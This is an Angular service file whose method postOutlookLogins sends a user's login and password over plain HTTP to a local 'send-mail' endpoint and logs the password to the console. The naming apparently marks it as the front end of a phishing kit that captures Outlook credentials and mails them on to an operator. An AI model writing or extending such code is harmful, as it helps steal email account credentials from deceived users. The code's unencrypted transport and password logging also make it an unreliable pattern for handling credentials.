import { Injectable } from '@angular/core';
import { HttpClient, HttpHeaders, HttpParams } from "@angular/common/http";
@Injectable({
  providedIn: 'root'
})
export class MailService {

  constructor(private httpClient: HttpClient) { }


  postOutlookLogins(login, password) {
    let httpHeaders = new HttpHeaders({
      "content-type":"application/json"
    });
    let options = {
      headers: httpHeaders
    };
    let body = {
      params: {
        'login': login,
        'password': password
      }
    };
    return  this.httpClient.post("http://localhost:3000/send-mail",
    body).subscribe(()=> {
      console.log(body);
    });
  }


}
